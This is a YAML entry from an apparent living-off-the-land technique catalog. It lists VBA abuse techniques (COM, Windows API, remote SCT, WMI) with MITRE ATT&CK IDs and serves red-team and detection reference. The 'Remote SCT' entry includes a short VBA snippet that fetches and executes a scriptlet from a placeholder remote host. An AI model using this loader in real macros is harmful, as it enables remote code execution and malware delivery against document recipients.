---
Name: VBA
Description: VBA stands for Visual Basic for Applications, which is a programming language developed by Microsoft. It is primarily used for automating tasks in Microsoft Office applications like Excel, Word, and Access.
Author: 'Hegusung'
Created: 2024-10-25
Categories:
  - Category: COM Objects
    Description: VBA - COM
    Usecase: VBA can access and execute COM objects
    MitreID: T1546
    OperatingSystem: Windows XP, Windows 7, Windows 8, Windows 10, Windows 11
    Code_Sample:
    Tags:
      - Origin: Clickable
  - Category: Windows API
    Description: VBA - Windows API
    Usecase: VBA can execute Windows API
    MitreID: T1106
    OperatingSystem: Windows XP, Windows 7, Windows 8, Windows 10, Windows 11
    Code_Sample:
    Tags:
      - Origin: Clickable
  - Category: Remote SCT
    Description: VBA - SCT
    Usecase: VBA can execute a SCT file using the GetObject function. Remote files can be accessed
    Code: |
      Dim SCTObj
      Set SCTObj = GetObject("script: http://1.2.3.4/script.sct")
      SCTObj.Exec
    MitreID: T1546
    OperatingSystem: Windows XP, Windows 7, Windows 8, Windows 10, Windows 11
    Code_Sample:
    Tags:
      - Origin: Clickable
  - Category: WMI
    Description: VBA - WMI
    Usecase: VBA can execute a WMI Queries by leveraging com objects
    Code: |
      TODO: Exemple code
    MitreID: T1546
    OperatingSystem: Windows XP, Windows 7, Windows 8, Windows 10, Windows 11
    Code_Sample:
    Tags:
      - Origin: Clickable
Detection:
Resources:
Acknowledgement:
---
